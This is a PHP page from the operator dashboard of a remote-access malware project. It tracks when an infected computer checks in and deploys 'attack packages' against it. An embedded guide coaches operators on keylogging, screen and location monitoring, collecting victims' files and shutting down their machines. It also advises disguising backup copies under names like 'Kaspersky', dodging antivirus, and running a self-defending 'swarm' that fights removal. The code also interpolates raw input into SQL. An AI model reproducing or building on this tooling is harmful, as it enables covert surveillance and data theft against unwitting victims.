<?php

/** @noinspection PhpUnusedParameterInspection */

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\AttackFactory;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\HtmlTemplate;
use Kelvinho\Virus\Timezone\Timezone;
use Kelvinho\Virus\User\User;
use function Kelvinho\Virus\filter;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\initializeArray;
use function Kelvinho\Virus\map;
use function Kelvinho\Virus\niceFileSize;

/** @var PackageRegistrar $packageRegistrar */

/**
 * Displays a table of viruses.
 *
 * @param array $attack_ids A list of attack_ids
 * @param array $visibleFields An array containing the columns you want to display. Example would be [0, 1, 2, 4]
 * @param AttackFactory $attackFactory
 * @param User $user
 * @param PackageRegistrar $packageRegistrar
 * @param string $virus_id
 * @param Timezone $timezoneObject
 */
function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, string $virus_id, Timezone $timezoneObject) {
    if (count($attack_ids) === 0) { ?>
        <p>(No attacks)</p>
    <?php } else { ?>
        <div style="overflow: auto;" class="w3-card">
            <table class="w3-table w3-bordered w3-border w3-hoverable">
                <tr class="w3-white"><?php
                    echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
                    echo in_array(1, $visibleFields) ? "<th>Package</th>" : "";
                    echo in_array(2, $visibleFields) ? "<th>Hash/id</th>" : "";
                    echo in_array(3, $visibleFields) ? "<th>Executed time</th>" : "";
                    echo in_array(4, $visibleFields) ? "<th>Disk space</th>" : "";
                    echo in_array(5, $visibleFields) ? "<th></th>" : ""; ?>
                </tr>
                <?php foreach ($attack_ids as $attack_id) {
                    $attack = $attackFactory->get($attack_id);
                    echo "<tr onclick = \"redirect('$attack_id')\" style=\"cursor: pointer;\">";
                    //echo "<tr>";
                    //echo "<a href='" . DOMAIN . "/ctrls/viewVirus?vrs=$virus_id&aks=$attack_id'>";
                    echo in_array(0, $visibleFields) ? "<td>" . $attack->getName() . "</td>" : "";
                    echo in_array(1, $visibleFields) ? "<td>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</td>" : "";
                    echo in_array(2, $visibleFields) ? "<td>" . formattedHash($attack->getAttackId()) . "</td>" : "";
                    echo in_array(3, $visibleFields) ? "<td>" . $timezoneObject->display($user->getTimezone(), $attack->getExecutedTime()) . "</td>" : "";
                    echo in_array(4, $visibleFields) ? "<td>" . niceFileSize($attack->usage()->getStatic()) . "</td>" : "";
                    echo in_array(5, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteAttack('" . $attack->getAttackId() . "')\">Delete</button></td>" : "";
                    echo "</a></tr>";
                } ?>
            </table>
        </div>
    <?php }
}

if (!$session->has("virus_id")) Header::redirectToHome();
$virus_id = $session->getCheck("virus_id");
if (!$authenticator->authorized($virus_id)) Header::redirectToHome();

$virus = $virusFactory->get($virus_id);
$user = $userFactory->get($session->get("user_handle")); ?>
<html lang="en_US">
<head>
    <title>Virus info</title>
    <?php HtmlTemplate::header(); ?>
    <style>
        #dailyChartDiv {
            position: relative;
            margin: auto;
            width: 40vw;
            display: inline-block;
        }

        #monthlyChartDiv {
            position: relative;
            margin: auto;
            width: 40vw;
            display: inline-block;
        }

        .w3-table td {
            vertical-align: inherit;
        }

        @media only screen and (max-width: 900px) {
            #dailyChartDiv {
                width: 60vw;
                display: block;
            }

            #monthlyChartDiv {
                width: 60vw;
                display: block;
            }
        }

        @media only screen and (max-width: 600px) {
            #dailyChartDiv {
                width: 80vw;
                display: block;
            }

            #monthlyChartDiv {
                width: 80vw;
                display: block;
            }
        }
    </style>
</head>
<body>
<?php HtmlTemplate::topNavigation($virus->getName(), $virus->getVirusId(), null, null, $user->isHold()); ?>
<h2>Virus info</h2>
<div class="w3-row">
    <div class="w3-col l4 m4 s6" style="padding-right: 8px;">
        <label for="name">Name</label>
        <input id="name" class="w3-input" type="text" value="<?php echo $virus->getName(); ?>">
    </div>
    <div class="w3-col l4 m4 w3-hide-small" style="padding-right: 8px;">
        <label for="hash">Hash/id</label>
        <input id="hash" class="w3-input" type="text" disabled value="<?php echo $virus_id; ?>">
    </div>
    <div class="w3-col l4 m4 s6">
        <label for="lastPing">Last ping</label>
        <input id="lastPing" class="w3-input" type="text" disabled
               value="<?php echo $timezone->display($user->getTimezone(), $virus->getLastPing()) . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
    </div>
</div>
<br>
<label for="profile">Profile</label>
<textarea id="profile" cols="80" class="w3-input"><?php echo $virus->getProfile(); ?></textarea>
<br>
<button class="w3-btn w3-red" onclick="updateVirus()">Update</button>
<h2>Activity</h2>
<div>
    <div id="dailyChartDiv">
        <div style="position: absolute;width: 30%;height: 100%;left: 0;opacity: 0.2" class="w3-hover-grey" onclick="gotoPreviousDay()"></div>
        <div style="position: absolute;width: 30%;height: 100%;left: 70%;opacity: 0.2" class="w3-hover-grey" onclick="gotoNextDay()"></div>
        <canvas id="dailyChart"></canvas>
    </div>
    <div id="monthlyChartDiv">
        <canvas id="monthlyChart"></canvas>
    </div>
</div>
<p>The daily active view shows at which times the virus reports back indicating that it is still alive and still
    listening, while the monthly frequency view shows how many hours the virus is active in a particular hour (ex.
    from 03:00 to 04:00) for a whole month. The two actually is kinda similar, not much different there.</p>
<h2>New attack</h2>
<label for="attackName">Name. This is an optional short name to help you stay organized</label>
<input id="attackName" class="w3-input" type="text">
<br>
<div class="w3-row">
    <!--suppress HtmlFormInputWithoutLabel -->
    <select id="attackPackage" class="w3-select w3-col l10 m9 s8" name="option" style="padding: 8px;">
        <option value="" disabled selected>Choose attack package</option>
        <?php map($packageRegistrar->getPackages(), function ($package) use ($packageRegistrar) { ?>
            <option value="<?php echo "$package"; ?>"><?php echo $packageRegistrar->getDisplayName($package); ?></option>
        <?php }); ?>
    </select>
    <div style="padding-left: 8px;" class="w3-col l2 m3 s4">
        <button class="w3-btn w3-block w3-red" onclick="continueAttack()">Continue</button>
    </div>
</div>
<?php map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) { ?>
    <p id="packageDescription-<?php echo $dbName; ?>" class="packageDescriptions">Package
        description: <?php echo $packageRegistrar->getDescription($dbName); ?></p>
<?php }); ?>
<div id="message" style="color: red;"></div>
<h2>Background attacks</h2>
<h3>Offline</h3>
<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
<h3>Online</h3>
<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
<h2>One time attacks</h2>
<h3>Dormant attacks</h3>
<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
<h3>Deployed attacks</h3>
<p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
    be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
    is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
    here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
    over again.</p>
<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
<h3>Executed attacks</h3>
<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
<h2>How to choose?</h2>
<p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
    guide.</p>
<h3>Attack types</h3>
<ul>
    <li><b>One time</b>: These are attacks that run once, they report back, and you view the results. Pretty
        straightforward
    </li>
    <li><b>Session</b>: These are attacks that run for a short period of time (~5 to 30 minutes), giving you results in
        realtime, and once that period of time is over, it behaves just like a one time attack. You can view the
        results, you can delete them, and so on. These can be things like, monitor their screen every 5 seconds and
        streaming back. Don't expect this to be smooth like Skype or TeamViewer, because the environment the virus is in
        is quite hostile and thus it must not consume a lot of CPU, or else it will be detected. There can be other
        things too, like monitoring what keys do they press.
    </li>
    <li><b>Background</b>: These are attacks that can run indefinitely if you choose to. Old data will be deleted, new
        data will keep streaming in and you can decide what data to keep. These can be things like monitoring their
        drives (know if they have plugged in a USB or something), or monitoring their screen every hour or so. Then
        there are things like monitoring what programs they are running, and kill them if you so desire. However, it
        might not be a great idea to enable all background attacks, because this will likely consume lots of resources
        and the chance of being detected is much higher.
    </li>
</ul>
<h3>Starting up</h3>
<p>When the virus is newly installed, you will want to test out if the virus gets installed properly. These packages are
    simple, can't go wrong, and mostly just gather system information:</p>
<ul>
    <li>CollectEnv</li>
    <li>ScanPartitions</li>
    <li>SystemInfo</li>
</ul>
<p>These packages don't need any configuring to do. You can just create a new attack, deploy it and receive the
    results back.</p>
<h3>Getting into the action</h3>
<p>When you get the hang of what is available on the target computer, you can use <b>ExploreDir</b>
    to explore what files and folders are there on the host computer, then use <b>CollectFile</b> to collect any
    files that pique your interest.</p>
<p>The virus itself is pretty stealthy, but if for whatever reason that you need to self destruct the virus
    completely, leaving no traces behind, you can use the <b>SelfDestruct</b> package. Be warned that once you have
    done this, there is absolutely no way of recovering it, even I can't recover it and you pretty much have to
    have access to their computer again or talk really sweet to them and whatnot. Then there's the <b>Power</b> package,
    which can let you shutdown or restart the computer at will, <b>NewVirus</b> will let you install multiple backup
    viruses at any location you would like. I would suggest you name the directory of the virus something that sounds
    legitimate, like "Calculator", "ECommerce", and "Kaspersky". <b>Screenshot</b> will let you take a screenshot.
    Please note that this package is the most easily detected part of the entire virus, so proceed with caution, and
    stop immediately if you see antivirus software popping up on the target machine.</p>
<p>At this time, you may want to use some background attacks, like <b>MonitorLocation</b> which will get their location
    every 20 minutes, and have results last up to a day. You can of course, save interesting places to view later, which
    won't go away.</p>
<h3>Getting into the weeds</h3>
<p>If you are an advanced user. That means, you know your stuff, you know specifically how the windows command
    line work, you know about its permission schemes, you know how the boot up process works, etc, then try out <b>ExecuteScript</b>.
    You can execute a random script that you desire, and you can host extra resources just for the attack so installing
    new scripts are easier than ever. Please note that because you can make mistakes, consider using other packages if
    it fits your goal right away, because running custom, untested code can make the virus unstable and thus, you may
    lose it. I highly suggest going to the <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue;">source code</a>,
    understand how the virus actually works before writing any scripts. To go along side with that, there's the <b>CheckPermission</b>
    package, which will check whether a directory is writable by the virus or not. Finally, there's the
    <b>ActivateSwarm</b> package, which will install a virus swarm that will look out for each other, and can fight back
    when the user attempts to delete or make it stop running. This also means you dont have much control over the
    swarm's architecture itself and can be a negative point. Also right now, I have not exhaustively test out everything
    that can go wrong with it, so please spin up a virtual machine and run this, because again, you will not have
    control over it except for sending payloads.</p>
<p>Note that some packages are "easy", others are "advanced". If a package is easy, that means that it is
    fairly difficult to screw something up, and it's pretty easy to just execute it without thinking of its
    consequences. If it is not, that means that it is easy to screw things up, and you might accidentally remove the
    virus from existence, or you have to know more about what you are planning to do to understand how to deploy it
    successfully.</p>
</body>
<?php HtmlTemplate::scripts(); ?>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js"></script>
<!--suppress EqualityComparisonWithCoercionJS -->
<script type="application/javascript">
    const gui = {
        packageDescriptions: $(".packageDescriptions"),
        message: $("#message"),
        attackName: $("#attackName"),
        attackPackage: $("#attackPackage")
    };

    function updateVirus() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/updateVirus",
            type: "POST",
            data: {
                virus_id: "<?php echo $virus_id; ?>",
                name: $("#name").val(),
                profile: $("#profile").val()
            },
            success: () => window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs=$virus_id"; ?>"
        });
    }

    gui.packageDescriptions.css("display", "none");

    gui.attackPackage.change(function () {
        const packageDbName = gui.attackPackage.val();
        gui.packageDescriptions.css("display", "none");
        $("#packageDescription-" + packageDbName.replace(/\./g, "\\.")).css("display", "block");
        gui.message.html("");
    });

    function continueAttack() {
        if (!gui.attackPackage.val()) {
            gui.message.html("<br>Please choose an attack package first");
            return;
        }
        let attackName = gui.attackName.val();
        if (attackName.length > 50) {
            gui.message.html("Message name should be less than 50 characters");
            return;
        }
        if (attackName === "") attackName = "(not set)";
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER . "/newAttack"; ?>",
            type: "POST",
            data: {
                virus_id: <?php echo "\"$virus_id\""; ?>,
                attack_package: gui.attackPackage.val(),
                name: attackName
            },
            success: () => window.location = "<?php echo DOMAIN . "/attack"; ?>"
        });
    }

    let clickHold = false; // prevent the delete button click from triggering the tr click

    function deleteAttack(attack_id) {
        clickHold = true;
        $.ajax({
            url: "<?php echo DOMAIN; ?>/vrs/<?php echo $virus->getVirusId(); ?>/aks/" + attack_id + "/ctrls/delete",
            type: "POST",
            success: () => window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs=$virus_id"; ?>"
        });
    }

    let ctrlIsPressed = false;
    $(document).keydown(event => (event.which == "17" ? (ctrlIsPressed = true) : 0));
    $(document).keyup(() => ctrlIsPressed = false);

    function redirect(attack_id) {
        if (clickHold) {
            clickHold = false;
            return;
        }
        if (ctrlIsPressed) {
            window.open("<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id, "_blank");
        } else {
            window.location = "<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id;
        }
    }

    <?php
    function fixHour(int $hour) {
        return ($hour + 24 * 3) % 24;
    }

    function getUptimes(string $virus_id): array {
        global $mysqli;
        $uptimes = [];
        if (!$answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time")) return [];
        while ($row = $answer->fetch_assoc())
            $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
        return $uptimes;
    }

    /**
     * Get a graphable 24-element array of {"hours", "label"}
     *
     * @param string $virus_id The virus id
     * @param int $timezoneOffset
     * @param int $startTimeOfDay
     * @return array the graphable array
     */
    function getDailyTimes(string $virus_id, int $timezoneOffset, int $startTimeOfDay = -1) {
        // important variables
        if ($startTimeOfDay == -1) {
            $startTimeOfDay = time() - 24 * 3600;
        }
        $startTimeOfDay = strtotime(date("Y-m-d H:00:00", $startTimeOfDay));
        $endTimeOfDay = $startTimeOfDay + 24 * 3600;
        $cycles = 12;// 12 cycles per hour, meaning 5 minutes per cycle
        // fetching uptimes
        $uptimes = getUptimes($virus_id);
        // filtering out the uptimes that are more than 1 month away
        $uptimes = filter($uptimes, function ($element, $index, $data) {
            return $data["startTime"] < $element["unix_time"] && $data["endTime"] > $element["unix_time"];
        }, ["startTime" => $startTimeOfDay, "endTime" => $endTimeOfDay]);
        $uptimes[] = ["unix_time" => $endTimeOfDay];
        $data = initializeArray(24, 0); // string hour_interval => int hours
        $analysisTime = $startTimeOfDay;
        $analysisTimeSlice = date("G", $analysisTime);
        if (count($uptimes) > 1) {
            $uptimeCounter = 0;
            $loopCounter = 0;
            $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
            $active = 1 - $uptimes[$uptimeCounter]["active"];
            while (true) {
                if ($analysisTime > $nextEntryUptime) {
                    $uptimeCounter += 1;
                    if ($uptimeCounter >= count($uptimes)) {
                        break;
                    }
                    $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                    $active = 1 - $active;
                }
                $data[intdiv($loopCounter, $cycles) % 24] += ($active) / $cycles;
                $analysisTime += 3600 / $cycles;
                $loopCounter += 1;
            }
        }
        $graphable = [];
        //$hourSliceLabels = [0 => "00:00", 6 => "06:00", 12 => "12:00", 18 => "18:00"];
        $hourSliceLabels = [0 => "00:00", 4 => "04:00", 8 => "08:00", 12 => "12:00", 16 => "16:00", 20 => "20:00"];
        for ($i = 0; $i < 24; $i++) {
            $graphable[$i] = ["hours" => $data[$i], "label" => @$hourSliceLabels[fixHour($i + $analysisTimeSlice + ((int) ($timezoneOffset / 3600)))]];
        }
        return $graphable;
    }
    //$graphableDaily = getDailyTimes($virus_id, $user->getTimezone());
    $graphableDaily = getDailyTimes($virus_id, $timezone->getOffset($user->getTimezone()));
    ?>
    const days = <?php echo "[" . join(", ", map([14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1], function ($daysBack, $index, $data) {
            $startTime = $data["currentTime"] - $daysBack * 24 * 3600;
            $graphableDaily = getDailyTimes($data["virus_id"], $data["timezoneOffset"], $startTime);
            return "{labels: [" . join(", ", map($graphableDaily, function ($element) {
                    return "\"" . $element["label"] . "\"";
                })) . "], " .
                "data: [" . join(", ", map($graphableDaily, function ($element) {
                    return min($element["hours"], 1) * 100;
                })) . "], " .
                "title: \"" . date("M j", $startTime) . " - " . date("M j", $startTime + 24 * 3600) . "\"}";
        }, ["currentTime" => time(), "timezoneOffset" => $timezone->getOffset($user->getTimezone()), "virus_id" => $virus_id])) . "];";

        function getMonthlyTimes(string $virus_id, int $timezoneOffset) {
            // important variables
            $currentTime = time();
            $cycles = 12;// 12 cycles per hour, meaning 5 minutes per cycle
            // fetching uptimes
            $uptimes = getUptimes($virus_id);
            // filtering out the uptimes that are more than 1 month away
            $uptimes[] = ["unix_time" => $currentTime];
            $uptimes = filter($uptimes, function ($element, $index, $currentTime) {
                return $currentTime - $element["unix_time"] < 30 * 24 * 3600;
            }, $currentTime);
            $data = initializeArray(24, 0); // string hour_interval => int hours
            $analysisTime = $currentTime - 30 * 24 * 3600;
            $analysisTimeSlice = date("G", $analysisTime);
            if (count($uptimes) > 1) {
                $uptimeCounter = 0;
                $loopCounter = 0;
                $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                $active = 1 - $uptimes[$uptimeCounter]["active"];
                while (true) {
                    if ($analysisTime > $nextEntryUptime) {
                        $uptimeCounter += 1;
                        if ($uptimeCounter >= count($uptimes)) {
                            break;
                        }
                        $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                        $active = 1 - $active;
                    }
                    $data[intdiv($loopCounter, $cycles) % 24] += ($active) / $cycles;
                    $analysisTime += 3600 / $cycles;
                    $loopCounter += 1;
                }
            }
            $graphable = [];
            for ($i = 0; $i < 24; $i++)
                $graphable[$i] = ["hours" => $data[fixHour($i - $analysisTimeSlice - ((int) ($timezoneOffset / 3600)))]];
            return $graphable;
        }
        $graphableMonthly = getMonthlyTimes($virus_id, $timezone->getOffset($user->getTimezone()));
        ?>

        chartColors = {
            red: 'rgb(255, 99, 132)',
            orange: 'rgb(255, 159, 64)',
            yellow: 'rgb(255, 205, 86)',
            green: 'rgb(75, 192, 192)',
            blue: 'rgb(54, 162, 235)',
            purple: 'rgb(153, 102, 255)',
            grey: 'rgb(201, 203, 207)'
        };

    Chart.defaults.global.elements.point.radius = 0;

    let dayIndex = days.length - 1;

    dailyChart = new Chart(document.getElementById('dailyChart').getContext('2d'), {
        type: 'line',
        data: {
            labels: days[dayIndex].labels,
            datasets: [{
                label: 'First dataset',
                //steppedLine: "middle",
                backgroundColor: chartColors.orange,
                borderColor: chartColors.orange,
                borderWidth: 0,
                data: days[dayIndex].data,
                fill: true
            }]
        },
        options: {
            responsive: true,
            title: {
                display: true,
                text: "Daily active view (" + days[dayIndex].title + ")"
            },
            aspectRatio: 1.8,
            hover: {mode: 'nearest', intersect: true},
            legend: {display: false},
            scales: {
                xAxes: [{ticks: {autoSkip: false}}],
                yAxes: [{scaleLabel: {display: true, labelString: '% Hour'}}]
            }
        }
    });

    function changeDayGraph() {
        dailyChart.data.labels = days[dayIndex].labels;
        dailyChart.data.datasets[0].data = days[dayIndex].data;
        dailyChart.options.title.text = "Daily active view (" + days[dayIndex].title + ")";
        dailyChart.update();
    }

    function gotoNextDay() {
        if (dayIndex < days.length - 1) dayIndex += 1;
        changeDayGraph();
    }

    function gotoPreviousDay() {
        if (dayIndex > 0) dayIndex -= 1;
        changeDayGraph();
    }

    new Chart(document.getElementById('monthlyChart').getContext('2d'), {
        type: 'line',
        data: {
            labels: ["00:00", "", "", "", "04:00", "", "", "", "08:00", "", "", "", "12:00", "", "", "", "16:00", "", "", "", "20:00", "", "", ""],
            datasets: [{
                label: 'Second dataset',
                backgroundColor: chartColors.green,
                borderColor: chartColors.green,
                borderWidth: 0,
                cubicInterpolationMode: 'monotone',
                data: [<?php echo join(", ", map($graphableMonthly, function ($element) {
                    return $element["hours"];
                })); ?>]
            }]
        },
        options: {
            responsive: true,
            title: {display: true, text: "Monthly frequency view"},
            aspectRatio: 1.8,
            legend: {display: false},
            scales: {
                xAxes: [{ticks: {autoSkip: false}}],
                yAxes: [{scaleLabel: {display: true, labelString: 'Hours'}}]
            }
        }
    });

    // make the #profile textarea auto adjust the height
    $('#profile').each(function () {
        this.setAttribute('style', 'height:' + (this.scrollHeight) + 'px;overflow-y:hidden;resize:none;');
    }).on('input', function () {
        this.style.height = 'auto';
        this.style.height = (this.scrollHeight) + 'px';
    });

</script>
</html>
